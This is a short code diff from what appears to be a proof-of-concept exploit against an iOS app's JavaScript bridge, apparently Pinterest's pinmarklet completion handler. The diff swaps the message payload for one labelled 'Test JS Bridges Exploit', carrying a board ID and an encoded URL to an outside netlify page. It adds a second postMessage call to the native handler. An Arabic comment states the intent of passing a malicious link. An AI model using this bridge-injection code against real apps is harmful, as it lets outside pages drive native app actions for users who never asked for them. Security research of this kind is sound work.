@@ -81,14 +81,16 @@
         // محاولة تمرير رابط خبيث (ممكن يستغل تحميل صور ضارة مثلا)
      
         const data = {
-        type: "pinmarklet",
-        v: "v6.1.0",
-        pmReason: "scan_complete",
-        pmCount: 1,
-        pmTime: 143,
-        pmClient: "ios",
-        pmUrl: "https://astonishing-ganache-ed3660.netlify.app/arc.html"
+        board_id: "813392451390315106",
+        color: "#bf8f97",
+        description: "Test JS Bridges Exploit",
+        method: "in_app_browser",
+        found_metadata:"%7B%7D",
+        source_url: "https%3A%2F%2Fastonishing-ganache-ed3660.netlify.app%2Farc.html"
 };
+
+window.webkit.messageHandlers.pinmarkletCompletionHandler.postMessage(data);
+
 
 window.webkit.messageHandlers.pinmarkletCompletionHandler.postMessage(data);
 
